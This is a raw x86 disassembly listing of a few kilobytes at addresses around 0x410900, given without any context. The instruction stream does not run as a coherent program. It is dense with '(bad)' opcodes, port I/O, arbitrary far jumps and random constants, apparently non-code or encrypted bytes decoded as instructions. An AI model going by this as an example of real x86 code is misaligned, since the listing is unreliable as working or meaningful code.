  41090c:	xor    BYTE PTR [eax+ebp*8+0x6],0x7e
  410911:	retf   0xffff
  410914:	cmp    esp,DWORD PTR [ecx]
  410916:	pushf  
  410917:	push   edi
  410918:	out    0x63,al
  41091a:	xor    BYTE PTR [edx-0x111c8050],0x48
  410921:	imul   ecx,esi,0x2fb6c60b
  410927:	pcmpeqw mm2,mm5
  41092a:	push   es
  41092b:	adc    DWORD PTR [edi-0x62d249f2],eax
  410931:	out    dx,al
  410932:	mov    esi,0x75744d31
  410937:	sbb    DWORD PTR [edx-0x7ce28bc0],edi
  41093d:	ffreep st(3)
  41093f:	and    DWORD PTR [ecx+0x6e],edx
  410942:	int    0x4a
  410944:	mov    dh,0x21
  410946:	div    DWORD PTR [eax+0x19]
  410949:	ficom  WORD PTR [ecx+eax*1-0x2f73e71d]
  410950:	sub    BYTE PTR [ecx-0x23],ch
  410953:	ds out 0x9a,al
  410956:	push   ss
  410957:	jg     0x410959
  410959:	push   eax
  41095a:	loop   0x410973
  41095c:	dec    ebx
  41095d:	push   0x4d
  41095f:	ds mov bh,0xd8
  410962:	mov    bl,0xba
  410964:	rol    DWORD PTR ds:0x8f326646,1
  41096a:	mov    esi,0xbb16f49c
  41096f:	int3   
  410970:	pop    esp
  410971:	in     al,0x52
  410973:	fistp  DWORD PTR [ecx+0x17]
  410976:	jmp    0x41093c
  410978:	scas   al,BYTE PTR es:[edi]
  410979:	mov    eax,0x6c37a038
  41097e:	mov    ch,0xb3
  410980:	xchg   edx,eax
  410981:	icebp  
  410982:	lods   eax,DWORD PTR ds:[esi]
  410983:	adc    al,0xe8
  410985:	js     0x4109a1
  410987:	inc    esi
  410988:	jecxz  0x4109c9
  41098a:	data16 mov bh,0xf2
  41098d:	fs lock mov dl,0xfe
  410991:	test   dl,cl
  410993:	adc    DWORD PTR [edi-0x76],esp
  410996:	shl    BYTE PTR [ebp-0x6ea3f56],1
  41099c:	or     BYTE PTR [esi+eax*1+0x6a],al
  4109a0:	xchg   ebp,eax
  4109a1:	aad    0x5a
  4109a3:	push   0x51
  4109a5:	and    cl,cl
  4109a7:	test   ecx,esp
  4109a9:	pusha  
  4109aa:	sbb    DWORD PTR ds:0x2e43bb51,esp
  4109b0:	pop    ebx
  4109b1:	pop    eax
  4109b2:	scas   eax,DWORD PTR es:[edi]
  4109b3:	cmp    al,0x6b
  4109b5:	sti    
  4109b6:	out    dx,eax
  4109b7:	push   ebx
  4109b8:	test   al,0xf
  4109ba:	ins    DWORD PTR es:[edi],dx
  4109bb:	sub    ah,BYTE PTR [ebx-0x7b9e079b]
  4109c1:	in     eax,dx
  4109c2:	clc    
  4109c3:	ss pop eax
  4109c5:	or     edi,DWORD PTR [ecx]
  4109c7:	or     DWORD PTR [ebx+0x506fbb86],0xfdf68867
  4109d1:	ins    BYTE PTR es:[edi],dx
  4109d2:	mov    edx,0x511d9a85
  4109d7:	popf   
  4109d8:	(bad)  
  4109d9:	pop    edi
  4109da:	ret    0x8da2
  4109dd:	or     eax,0x1022b4af
  4109e2:	mov    bl,0x91
  4109e4:	lock add DWORD PTR [ebp+0x3b],esp
  4109e8:	daa    
  4109e9:	(bad)  
  4109ea:	call   0x6f359f6
  4109ef:	push   0x83f8b65c
  4109f4:	sub    al,0x95
  4109f6:	adc    cl,BYTE PTR [edi]
  4109f8:	in     eax,dx
  4109f9:	hlt    
  4109fa:	inc    ebp
  4109fb:	test   DWORD PTR [ebx],edi
  4109fd:	cdq    
  4109fe:	pop    es
  4109ff:	mov    cl,0x37
  410a01:	jmp    0x4109f2
  410a03:	and    ecx,DWORD PTR [esi]
  410a05:	jo     0x410a1c
  410a07:	xor    edx,eax
  410a09:	mov    edx,0xdc28d83
  410a0e:	popf   
  410a0f:	sub    eax,DWORD PTR [edi-0x4e]
  410a12:	aaa    
  410a13:	or     eax,0xb52f0f4
  410a18:	stos   DWORD PTR es:[edi],eax
  410a19:	sahf   
  410a1a:	(bad)  
  410a1b:	sub    al,0xd6
  410a1d:	out    dx,eax
  410a1e:	adc    al,0xb8
  410a20:	add    edx,DWORD PTR [ebx-0x5b]
  410a23:	mov    DWORD PTR ds:0xf83b3a11,ebx
  410a29:	mov    esp,0x581873e9
  410a2e:	cld    
  410a2f:	inc    esi
  410a30:	jge    0x4109dc
  410a32:	xchg   edx,eax
  410a33:	lahf   
  410a34:	xlat   BYTE PTR ds:[ebx]
  410a35:	adc    eax,0xbe55044e
  410a3a:	imul   WORD PTR [edx+0x1d]
  410a3e:	mov    al,ds:0x3b5468c9
  410a43:	jecxz  0x410a6e
  410a45:	pop    edi
  410a46:	and    dh,dh
  410a48:	cld    
  410a49:	inc    ebx
  410a4a:	xor    ebp,edi
  410a4c:	fs add bh,ah
  410a4f:	retf   0x89db
  410a52:	nop
  410a53:	dec    eax
  410a54:	popa   
  410a55:	push   esi
  410a56:	test   BYTE PTR [edi+0x278907f9],dh
  410a5c:	loop   0x410a9b
  410a5e:	ins    BYTE PTR es:[edi],dx
  410a5f:	popa   
  410a60:	mov    ds:0xa57d6aa6,eax
  410a65:	or     edx,DWORD PTR [eax+0x4b]
  410a68:	mov    dl,0x61
  410a6a:	dec    ebx
  410a6b:	dec    edi
  410a6c:	mov    cl,0x9d
  410a6e:	jnp    0x410a8e
  410a70:	std    
  410a71:	clc    
  410a72:	out    dx,al
  410a73:	xor    esp,DWORD PTR [ebx]
  410a75:	fs push ebp
  410a77:	test   eax,0x580e86c3
  410a7c:	xchg   BYTE PTR [ebx+0x51],ah
  410a7f:	mov    ch,0x31
  410a81:	les    edi,FWORD PTR [edi]
  410a83:	and    esi,edx
  410a85:	push   ecx
  410a86:	xchg   BYTE PTR [edi-0x2b49dc21],bh
  410a8c:	mov    bl,0xbf
  410a8e:	mov    cl,0x51
  410a90:	push   ss
  410a91:	cmc    
  410a92:	addr16 or ch,ch
  410a95:	or     eax,0xecb457e5
  410a9a:	jle    0x410ae5
  410a9c:	(bad)  
  410a9d:	outs   dx,BYTE PTR ds:[esi]
  410a9e:	lds    eax,FWORD PTR [eax]
  410aa0:	clc    
  410aa1:	mov    BYTE PTR [edx-0x11996db6],cl
  410aa7:	fimul  WORD PTR [esi+0x2df803d9]
  410aad:	xor    DWORD PTR [esi-0x29d6adca],eax
  410ab3:	mov    cl,0xb2
  410ab5:	arpl   WORD PTR [ebx],cx
  410ab7:	mov    eax,ds:0x88acaf2e
  410abc:	mov    BYTE PTR [edx],ah
  410abe:	xor    ecx,DWORD PTR ds:0x82b37e99
  410ac4:	pop    esi
  410ac5:	daa    
  410ac6:	shl    dl,0xb5
  410ac9:	mov    ebp,fs
  410acb:	(bad)  [esi-0x6a9c3dfb]
  410ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ad2:	pop    ecx
  410ad3:	mov    ch,0x80
  410ad5:	stc    
  410ad6:	mov    bh,0xc8
  410ad8:	(bad)  
  410ad9:	cwde   
  410ada:	xor    BYTE PTR [edi],bl
  410adc:	pop    esi
  410add:	aaa    
  410ade:	out    0x6c,al
  410ae0:	pop    eax
  410ae1:	or     al,0x3f
  410ae3:	pop    edx
  410ae4:	arpl   WORD PTR [ebp-0x6],ax
  410ae7:	sub    al,0x1f
  410ae9:	inc    esp
  410aea:	mov    ds:0x1866132c,eax
  410aef:	js     0x410a8b
  410af1:	xor    eax,0x14642790
  410af6:	push   esp
  410af7:	fist   WORD PTR [edi+0x73]
  410afa:	cmp    eax,DWORD PTR [edx+eiz*4]
  410afd:	pop    edx
  410afe:	stos   BYTE PTR es:[edi],al
  410aff:	pop    esp
  410b00:	jbe    0x410b16
  410b02:	jmp    0x410b14
  410b04:	add    DWORD PTR [edi+ecx*4],ebp
  410b07:	shr    DWORD PTR [ecx],0xe1
  410b0a:	xor    esp,esi
  410b0c:	je     0x410b62
  410b0e:	xchg   esp,eax
  410b0f:	pop    ss
  410b10:	cs repz jb 0x410b09
  410b14:	daa    
  410b15:	(bad)  
  410b16:	imul   esi,DWORD PTR [ebx+esi*8+0x4b],0x7f
  410b1b:	clc    
  410b1c:	into   
  410b1d:	sub    bl,BYTE PTR [edx]
  410b1f:	out    0x26,al
  410b21:	push   ds
  410b22:	mov    WORD PTR [ebx+0x47],cs
  410b25:	into   
  410b26:	inc    DWORD PTR [edx+0x21]
  410b29:	fmul   DWORD PTR [ecx]
  410b2b:	jge    0x410aae
  410b2d:	(bad)  
  410b2e:	mov    WORD PTR [edi-0x2fff132d],gs
  410b34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b35:	loopne 0x410af1
  410b37:	mov    eax,ds:0x9c0e2080
  410b3c:	test   al,0x86
  410b3e:	xor    ebp,DWORD PTR [ebp+0xe8d6d12]
  410b44:	mov    esp,ebx
  410b46:	pop    eax
  410b47:	sbb    eax,0x71cf6b42
  410b4c:	rcl    ecx,cl
  410b4e:	ret    
  410b4f:	push   edi
  410b50:	cmp    edx,esp
  410b52:	fsubr  DWORD PTR [edx-0x7e]
  410b55:	cmp    ah,BYTE PTR [ebp-0x3e385aa4]
  410b5b:	fcmovbe st,st(5)
  410b5d:	fwait
  410b5e:	add    edi,ecx
  410b60:	cwde   
  410b61:	or     DWORD PTR [bp-0x7a],ebp
  410b65:	loop   0x410b76
  410b67:	xchg   ebx,eax
  410b68:	mov    esp,0xb1336fa4
  410b6d:	mov    ah,0x9
  410b6f:	sub    bl,0xe1
  410b72:	mov    eax,0x46b8afdd
  410b77:	call   FWORD PTR [ecx-0x7b5c639d]
  410b7d:	push   ebp
  410b7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b7f:	leave  
  410b80:	mov    ah,0xbd
  410b82:	loop   0x410b77
  410b84:	mov    bh,0x18
  410b86:	stos   BYTE PTR es:[edi],al
  410b87:	xor    DWORD PTR [edi+0x40],ebx
  410b8a:	xor    cl,BYTE PTR [ebp+0x5a5983d6]
  410b90:	mov    bh,0xf0
  410b92:	pushf  
  410b93:	pop    ecx
  410b94:	jl     0x410b20
  410b96:	inc    ebp
  410b97:	fist   DWORD PTR [eax]
  410b99:	jmp    0x67c1:0xbc1437ec
  410ba0:	fst    DWORD PTR [ebp+0x60843398]
  410ba6:	jge    0x410c0c
  410ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ba9:	ret    0x4495
  410bac:	sti    
  410bad:	sbb    BYTE PTR [edi-0xf86f12],0xcd
  410bb4:	retf   0x894c
  410bb7:	dec    edx
  410bb8:	inc    BYTE PTR [esi-0x2a711fdb]
  410bbe:	pop    esp
  410bbf:	out    0x5d,al
  410bc1:	and    al,0x21
  410bc3:	push   esi
  410bc4:	jmp    0x410be0
  410bc6:	outs   dx,DWORD PTR ds:[esi]
  410bc7:	pushf  
  410bc8:	and    al,0x41
  410bca:	mov    eax,ds:0x7ca4c0aa
  410bcf:	sbb    DWORD PTR [ebx],ebp
  410bd1:	sub    esp,edi
  410bd3:	inc    edx
  410bd4:	mov    DWORD PTR [edx-0x13],ebx
  410bd7:	push   ebx
  410bd8:	pusha  
  410bd9:	jb     0x410c2c
  410bdb:	and    DWORD PTR [esi+0x1a],0x83918510
  410be2:	mov    cl,0x98
  410be4:	loopne 0x410bf9
  410be6:	mov    bl,0x80
  410be8:	cmp    DWORD PTR [esp+ebx*2],esp
  410beb:	and    cl,cl
  410bed:	dec    eax
  410bee:	mov    ebx,0xb75fb550
  410bf3:	pop    edi
  410bf4:	xchg   edi,eax
  410bf5:	dec    ebx
  410bf6:	lea    esp,[ebx]
  410bf8:	mov    ds:0x9163bea1,al
  410bfd:	call   0xe6ff7bce
  410c02:	aaa    
  410c03:	mov    al,ds:0x969934d3
  410c08:	xor    ebp,DWORD PTR [eax+0xb]
  410c0b:	cmp    edi,DWORD PTR cs:[eax+0x5d]
  410c0f:	inc    ecx
  410c10:	ins    BYTE PTR es:[edi],dx
  410c11:	lds    esi,FWORD PTR ds:0x6fb0364c
  410c17:	ins    DWORD PTR es:[edi],dx
  410c18:	pop    edx
  410c19:	daa    
  410c1a:	xor    al,0xbd
  410c1c:	sbb    BYTE PTR [ebx-0x10],cl
  410c1f:	xor    dl,BYTE PTR [edx-0x3a]
  410c22:	pop    edx
  410c23:	add    eax,0xcd95c114
  410c28:	retf   
  410c29:	ins    BYTE PTR es:[edi],dx
  410c2a:	(bad)
  410c2e:	pop    edx
  410c2f:	push   es
  410c30:	or     eax,0x83e82cd8
  410c35:	leave  
  410c36:	fcmovnu st,st(6)
  410c38:	stc    
  410c39:	les    edi,FWORD PTR [ecx]
  410c3b:	xchg   ebx,eax
  410c3c:	fwait
  410c3d:	mov    al,0xac
  410c3f:	push   es
  410c40:	repnz cld 
  410c42:	xchg   DWORD PTR [esi+edi*1-0x4ea67008],eax
  410c49:	sar    BYTE PTR [edi+0x4e],0x85
  410c4d:	in     eax,dx
  410c4e:	out    dx,al
  410c4f:	sub    cl,cl
  410c51:	xor    DWORD PTR [edi-0x5a526d2],edx
  410c57:	arpl   WORD PTR [edi-0x5b],di
  410c5a:	and    ah,BYTE PTR ds:0xfcc1eebc
  410c60:	dec    edi
  410c61:	add    edi,DWORD PTR [edx-0x40e109cf]
  410c67:	lods   al,BYTE PTR ds:[esi]
  410c68:	lock out dx,eax
  410c6a:	or     bh,BYTE PTR [eax-0x6369ac6a]
  410c70:	and    BYTE PTR [ecx+ebx*2-0x74bba327],0xad
  410c78:	sbb    esp,esi
  410c7a:	icebp  
  410c7b:	stos   DWORD PTR es:[edi],eax
  410c7c:	xchg   BYTE PTR [esi+0x7f],cl
  410c7f:	int3   
  410c80:	sbb    ebp,esi
  410c82:	fstp   TBYTE PTR [edx-0x2a2cbbd]
  410c88:	push   es
  410c89:	or     al,0x62
  410c8b:	ror    bl,cl
  410c8d:	add    bh,0x96
  410c90:	pop    edx
  410c91:	(bad)  
  410c92:	int3   
  410c93:	nop
  410c94:	cmp    BYTE PTR [ebx+ebx*4+0x1e186160],dl
  410c9b:	jno    0x410d04
  410c9d:	cmp    dl,dl
  410c9f:	test   eax,0x6ca81b3f
  410ca4:	mov    eax,0x19426027
  410ca9:	std    
  410caa:	test   eax,0xffe9edbf
  410caf:	and    eax,0x22fb0341
  410cb5:	pop    ds
  410cb6:	push   cs
  410cb7:	mov    DWORD PTR [esi+0x711c0bac],ecx
  410cbd:	mov    ebp,DWORD PTR [esi]
  410cbf:	dec    ebp
  410cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cc1:	jb     0x410c72
  410cc3:	imul   edi,DWORD PTR [esi],0xa1b04d81
  410cc9:	jmp    0x424d:0xa66e10dd
  410cd0:	dec    esi
  410cd1:	xchg   DWORD PTR [esi],edx
  410cd3:	int    0xff
  410cd5:	or     ebx,esi
  410cd7:	in     eax,0x46
  410cd9:	fcmovnbe st,st(5)
  410cdb:	dec    edi
  410cdc:	push   ebx
  410cdd:	fst    QWORD PTR [ebx+0xf]
  410ce0:	mov    bh,0xb0
  410ce2:	dec    ebp
  410ce3:	jno    0x410c88
  410ce5:	pop    es
  410ce6:	or     ebp,DWORD PTR [ebx+0x67]
  410ce9:	and    eax,DWORD PTR [esp+ecx*8]
  410cec:	dec    edi
  410ced:	aas    
  410cee:	imul   ecx,DWORD PTR [edx-0x6aacaab2],0xe60d546e
  410cf8:	xchg   esp,eax
  410cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cfa:	jo     0x410c98
  410cfc:	retf   
  410cfd:	es dec ebx
  410cff:	js     0x410cd1
  410d01:	cmp    al,0x94
  410d03:	jle    0x410d51
  410d05:	cmp    ecx,ecx
  410d07:	ret    0xb5fe
  410d0a:	sub    eax,0x5e1f15ba
  410d0f:	jbe    0x410d1d
  410d11:	inc    eax
  410d12:	stos   BYTE PTR es:[edi],al
  410d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d14:	das    
  410d15:	loopne 0x410cc6
  410d17:	sub    eax,0x387a417d
  410d1c:	test   BYTE PTR [eax-0x78],ch
  410d1f:	shr    eax,cl
  410d21:	and    esi,edx
  410d23:	mov    ebx,0x8bf72af4
  410d28:	jmp    0xb9a987aa
  410d2d:	dec    edx
  410d2e:	gs mov edi,0xab21b61a
  410d34:	mov    ds:0xbf968356,al
  410d39:	sar    dl,0x81
  410d3c:	cmp    bh,BYTE PTR [ecx+0x74c3aeac]
  410d42:	jnp    0x410d56
  410d44:	int3   
  410d45:	add    BYTE PTR [ecx+0x218c68],ch
  410d4b:	sub    edi,esp
  410d4d:	cmc    
  410d4e:	jb     0x410d84
  410d50:	js     0x410db6
  410d52:	xor    BYTE PTR [edi],bl
  410d54:	(bad)  
  410d55:	out    0xbb,al
  410d57:	ins    BYTE PTR es:[edi],dx
  410d58:	call   0x29a3:0x8abe3be5
  410d5f:	and    al,0x4a
  410d61:	cdq    
  410d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d63:	enter  0x552b,0x12
  410d67:	leave  
  410d68:	in     eax,0x1e
  410d6a:	jne    0x410dde
  410d6c:	sar    BYTE PTR [esi-0x4b8f79f7],cl
  410d72:	sub    DWORD PTR [edx-0x1b],0x3a3eb632
  410d79:	call   0xe662:0xa051f68d
  410d80:	adc    BYTE PTR [edi-0x5d9ede4d],dh
  410d86:	jne    0x410d31
  410d88:	test   eax,0x1f9d0560
  410d8d:	push   eax
  410d8e:	shl    DWORD PTR [edx-0x72fd72db],cl
  410d94:	dec    esi
  410d95:	mov    ebp,esi
  410d97:	leave  
  410d98:	stos   DWORD PTR es:[edi],eax
  410d99:	fs js  0x410e15
  410d9c:	or     al,0x58
  410d9e:	xchg   esp,eax
  410d9f:	call   0xbf0979d3
  410da4:	mov    esi,0x6049caf3
  410da9:	mov    esi,0xc4f3f71e
  410dae:	jb     0x410e27
  410db0:	sub    bl,BYTE PTR [ecx]
  410db2:	adc    DWORD PTR [edi+0x43eb08c7],edi
  410db8:	(bad)  
  410db9:	xor    eax,0x84ac39a3
  410dbe:	ins    DWORD PTR es:[edi],dx
  410dbf:	lds    esp,FWORD PTR [eax+eax*8-0x43]
  410dc3:	bound  ebx,QWORD PTR [ecx]
  410dc5:	test   eax,0xf1eb3ab3
  410dca:	loop   0x410dbd
  410dcc:	dec    edx
  410dcd:	lods   al,BYTE PTR ds:[esi]
  410dce:	pop    edx
  410dcf:	sbb    DWORD PTR [edi],edi
  410dd1:	test   eax,0x2bc000a1
  410dd6:	mov    dl,0x27
  410dd8:	popa   
  410dd9:	mov    ah,0x29
  410ddb:	cmc    
  410ddc:	pop    eax
  410ddd:	xchg   edi,eax
  410dde:	cdq    
  410ddf:	or     eax,0xfca1c3e7
  410de4:	ret    
  410de5:	mov    al,0xc0
  410de7:	shr    eax,cl
  410de9:	jne    0x410e34
  410deb:	shl    DWORD PTR [esi],cl
  410ded:	push   ebp
  410dee:	rcl    BYTE PTR [ecx],0xed
  410df1:	mov    ebp,0xad7b68a3
  410df6:	imul   eax,ebp,0x40
  410df9:	jns    0x410e65
  410dfb:	aaa    
  410dfc:	xor    BYTE PTR [edi-0x6094f2ae],0x1b
  410e03:	stos   DWORD PTR es:[edi],eax
  410e04:	jl     0x410e6d
  410e06:	jmp    0x38c7:0xd6e9dd
  410e0d:	out    dx,al
  410e0e:	push   cs
  410e0f:	je     0x410e4b
  410e11:	std    
  410e12:	jno    0x410e07
  410e14:	pop    ebp
  410e15:	push   eax
  410e16:	push   ss
  410e17:	ss mov ebx,0x4131eaba
  410e1d:	nop
  410e1e:	leave  
  410e1f:	lods   eax,DWORD PTR ds:[esi]
  410e20:	ss push 0x6d
  410e23:	mov    bl,0xd9
  410e25:	inc    ebx
  410e26:	das    
  410e27:	aaa    
  410e28:	adc    al,0xcf
  410e2a:	retf   0x4f53
  410e2d:	mov    ebx,0xfc4fd31c
  410e32:	and    DWORD PTR [eax+0x1c],0xffffffb3
  410e36:	push   esi
  410e37:	sub    DWORD PTR [edx+edi*4],esi
  410e3a:	rcl    BYTE PTR [ecx-0x78],1
  410e3d:	sub    eax,0xcbc09971
  410e42:	ja     0x410e0b
  410e44:	pop    ebx
  410e45:	cmp    bh,BYTE PTR [edi-0x7d66259e]
  410e4b:	mov    edi,0x405e5bbc
  410e50:	ffree  st(5)
  410e52:	popf   
  410e53:	add    cl,BYTE PTR [esi-0x49ea7f93]
  410e59:	mov    esp,0x1b787ec6
  410e5e:	lahf   
  410e5f:	loope  0x410e87
  410e61:	pop    es
  410e62:	sbb    ah,ch
  410e64:	jmp    0x9793709a
  410e69:	jbe    0x410e1a
  410e6b:	mov    WORD PTR [ecx+0x4f],ds
  410e6e:	bound  esi,QWORD PTR [edi]
  410e70:	xchg   BYTE PTR [edi+0x1f],ch
  410e73:	fs and eax,0x426a8e01
  410e79:	cdq    
  410e7a:	dec    edi
  410e7b:	mov    al,ds:0x240ff2bb
  410e80:	mov    ds:0x5c3efc65,eax
  410e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e86:	sub    eax,0x35d849b3
  410e8b:	mov    ds:0x5a867105,al
  410e90:	push   ebp
  410e91:	jmp    0xb705:0xd9f53e2e
  410e98:	push   es
  410e99:	outs   dx,BYTE PTR ds:[esi]
  410e9a:	popf   
  410e9b:	push   0xcee92914
  410ea0:	js     0x410ed3
  410ea2:	sub    cl,BYTE PTR [eax]
  410ea4:	aaa    
  410ea5:	or     esi,esi
  410ea7:	call   0x2d28:0xbc6fc14a
  410eae:	mov    ds:0x42bc7547,al
  410eb3:	hlt    
  410eb4:	je     0x410f25
  410eb6:	xchg   edi,eax
  410eb7:	in     eax,0xdd
  410eb9:	loop   0x410e7a
  410ebb:	test   BYTE PTR [edx+0x66c7e87b],bh
  410ec1:	mov    gs:0xa714f95a,al
  410ec7:	(bad)  
  410ec9:	mov    esi,0xe58c0343
  410ece:	jae    0x410f4c
  410ed0:	ss push cs
  410ed2:	stc    
  410ed3:	sbb    esp,DWORD PTR [ecx]
  410ed5:	je     0x410ec7
  410ed7:	(bad)
  410edb:	jl     0x410e7a
  410edd:	stos   DWORD PTR es:[edi],eax
  410ede:	xchg   dl,dl
  410ee0:	xor    al,BYTE PTR [ebx]
  410ee2:	mov    dh,0xd9
  410ee4:	sbb    BYTE PTR [eax+eax*8+0x475ab35b],ch
  410eeb:	icebp  
  410eec:	pop    ebx
  410eed:	icebp  
  410eee:	stos   DWORD PTR es:[edi],eax
  410eef:	int3   
  410ef0:	fdivr  QWORD PTR [esi]
  410ef2:	sub    BYTE PTR [ecx+0x7b],ah
  410ef5:	(bad)  
  410ef6:	mov    ebp,0x88bdec4b
  410efb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410efc:	punpckhbw mm0,QWORD PTR [esi]
  410eff:	sbb    al,0x75
  410f01:	sbb    DWORD PTR [eax-0x46],edi
  410f04:	repz fwait
  410f06:	scas   eax,DWORD PTR es:[edi]
  410f07:	repnz sbb ch,BYTE PTR [edx+0x568661e4]
  410f0e:	sub    BYTE PTR [eax-0x54],0xc2
  410f12:	fcomp  DWORD PTR [esi+0x48]
  410f15:	out    0xc5,eax
  410f17:	jp     0x410ee2
  410f19:	mov    ebp,0x54905a92
  410f1e:	adc    ebp,DWORD PTR [eax-0x3096ceb]
  410f24:	adc    DWORD PTR [edx-0x7c],ecx
  410f27:	xor    eax,0xde871017
  410f2c:	and    dl,0xa8
  410f2f:	lds    ebp,FWORD PTR [edi+edi*1]
  410f32:	iret   
  410f33:	xor    al,0xf
  410f35:	ja     0x410eef
  410f37:	and    BYTE PTR [ebx],0x99
  410f3a:	enter  0xea55,0x2d
  410f3e:	push   ecx
  410f3f:	in     eax,0x52
  410f41:	ss inc ebp
  410f43:	outs   dx,BYTE PTR ds:[esi]
  410f44:	pop    eax
  410f45:	mov    bh,0x7
  410f47:	mov    ch,0x9d
  410f49:	gs add ax,0x60b6
  410f4e:	adc    DWORD PTR [esi-0x24],ebp
  410f51:	mov    BYTE PTR [ebx+0x76],ah
  410f54:	push   es
  410f55:	mov    al,0xeb
  410f57:	jne    0x410f31
  410f59:	mov    esi,0xdf0f9b63
  410f5e:	xor    DWORD PTR [edi-0x50],0xffffffff
  410f62:	mov    ah,0x2a
  410f64:	gs popa 
  410f66:	and    bl,0x23
  410f69:	sub    BYTE PTR [edx+0x1f2883d1],bh
  410f6f:	adc    esp,DWORD PTR [ecx]
  410f71:	rcr    DWORD PTR [ebx+0x6c],1
  410f74:	mov    edi,0x8fd730e3
  410f79:	add    eax,0x1e0cb916
  410f7e:	or     eax,0xcf7b0d1b
  410f83:	repz or al,0x3
  410f86:	icebp  
  410f87:	or     DWORD PTR ds:0x1811fdd6,0xfffffffb
  410f8e:	sbb    ecx,0x7b
  410f91:	mov    eax,ds:0x2023e94
  410f96:	psubq  mm1,mm0
  410f99:	cmp    al,BYTE PTR [edx+edx*2-0x78]
  410f9d:	mov    eax,0x5428e81e
  410fa2:	jmp    0x410f71
  410fa4:	mov    DWORD PTR [edi+edx*1+0x3ea0b5c9],esi
  410fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fac:	out    dx,al
  410fad:	fsub   DWORD PTR [eax-0x9b5c75f]
  410fb3:	jnp    0x410f5e
  410fb5:	sbb    BYTE PTR [eax],cl
  410fb7:	cmp    DWORD PTR [eax],esi
  410fb9:	pop    ebp
  410fba:	std    
  410fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fbc:	mov    bl,0x96
  410fbe:	sub    al,0x21
  410fc0:	jge    0x410fab
  410fc2:	jl     0x410f98
  410fc4:	mov    ch,0x7b
  410fc6:	stos   BYTE PTR es:[edi],al
  410fc7:	mov    ds:0x1b33558c,eax
  410fcc:	dec    ecx
  410fcd:	xchg   edi,eax
  410fce:	xor    DWORD PTR [ebx-0x18],ebp
  410fd1:	nop
  410fd2:	pop    eax
  410fd3:	stos   DWORD PTR es:[edi],eax
  410fd4:	mov    eax,ds:0xd767a402
  410fd9:	xchg   edx,eax
  410fda:	jae    0x410fac
  410fdc:	dec    ebx
  410fdd:	sahf   
  410fde:	add    eax,0x229161d1
  410fe3:	dec    eax
  410fe4:	lahf   
  410fe5:	xor    eax,0xd8200d5
  410fea:	adc    ch,ch
  410fec:	rcl    BYTE PTR [ebp+0x7a],1
  410fef:	test   BYTE PTR [edi],dh
  410ff1:	call   0x3ca6:0xc3371c79
  410ff8:	xchg   edx,eax
  410ff9:	jne    0x41103e
  410ffb:	sub    edx,edx
  410ffd:	add    al,0x38
  410fff:	stos   DWORD PTR es:[edi],eax
  411000:	ror    BYTE PTR [esi],0xd4
  411003:	stos   DWORD PTR es:[edi],eax
  411004:	inc    edx
  411005:	in     eax,0xa0
  411007:	pop    ds
  411008:	(bad)  
  411009:	dec    esp
  41100a:	aaa    
  41100b:	mov    ch,0x97
  41100d:	in     eax,dx
  41100e:	push   edi
  41100f:	(bad)  
  411010:	push   cs
  411011:	ins    BYTE PTR es:[edi],dx
  411012:	push   cs
  411013:	les    edx,FWORD PTR [edx]
  411015:	mov    BYTE PTR [ebx],dh
  411017:	aam    0xf
  411019:	fwait
  41101a:	repnz in eax,0xaf
  41101d:	or     al,0x90
  41101f:	sub    eax,0xed5f7c63
  411024:	cli    
  411025:	loope  0x411058
  411027:	pop    esp
  411028:	out    0x23,al
  41102a:	fsub   DWORD PTR [ecx+0x2078b940]
  411030:	(bad)  
  411031:	int3   
  411032:	push   cs
  411033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411034:	iret   
  411035:	leave  
  411036:	adc    DWORD PTR [ebp+0x4],ebx
  411039:	adc    eax,0x16ba406
  41103e:	std    
  41103f:	std    
  411040:	ucomiss xmm0,DWORD PTR es:[ebx+0x3b]
  411045:	mov    eax,ds:0x51534475
  41104a:	sbb    al,0xb2
  41104c:	xchg   ecx,eax
  41104d:	jl     0x4110a1
  41104f:	push   cs
  411050:	clc    
  411051:	(bad)  
  411052:	xlat   BYTE PTR ds:[ebx]
  411053:	and    ecx,DWORD PTR [esi]
  411055:	cmp    ebp,DWORD PTR [ebx+0x63]
  411058:	cs in  al,0x12
  41105b:	mov    eax,ds:0xf32b7161
  411060:	iret   
  411061:	inc    ebx
  411062:	mov    cs,WORD PTR [ecx-0x21]
  411065:	add    BYTE PTR [esi-0x4d],ah
  411068:	pop    es
  411069:	fs out 0xbb,eax
  41106c:	mov    WORD PTR [ecx-0x48],fs
  41106f:	inc    eax
  411070:	imul   ebx,DWORD PTR [esi],0xffffffca
  411073:	mov    edi,0x3823be31
  411078:	dec    edi
  411079:	in     al,0x3b
  41107b:	jg     0x41100d
  41107d:	cli    
  41107e:	jno    0x411096
  411080:	xlat   BYTE PTR ds:[ebx]
  411081:	pushf  
  411082:	jge    0x411020
  411084:	add    cl,ch
  411086:	cmp    dh,0x5a
  411089:	jle    0x4110e0
  41108b:	push   cs
  41108c:	pop    ecx
  41108d:	or     esp,esi
  41108f:	loopne 0x4110c0
  411091:	popa   
  411092:	ins    BYTE PTR es:[edi],dx
  411093:	mov    ds:0xdb31afd7,al
  411098:	into   
  411099:	ds int 0x5a
  41109c:	outs   dx,DWORD PTR ds:[esi]
  41109d:	ja     0x411085
  41109f:	ds push es
  4110a1:	in     al,0x73
  4110a3:	jmp    0x8830:0x6d66ebdf
  4110aa:	loop   0x411070
  4110ac:	add    dl,ah
  4110ae:	xor    eax,0x1783a016
  4110b3:	jmp    0x1b5f7f13
  4110b8:	aas    
  4110b9:	mov    ah,0x22
  4110bb:	shl    BYTE PTR [ecx+0x3c35e826],1
  4110c1:	lea    edi,ds:0x14511d04
  4110c7:	das    
  4110c8:	ror    BYTE PTR [esi+0x13eec26],1
  4110ce:	sub    eax,0xc5700544
  4110d3:	mov    cl,BYTE PTR [edx-0x48]
  4110d6:	inc    esi
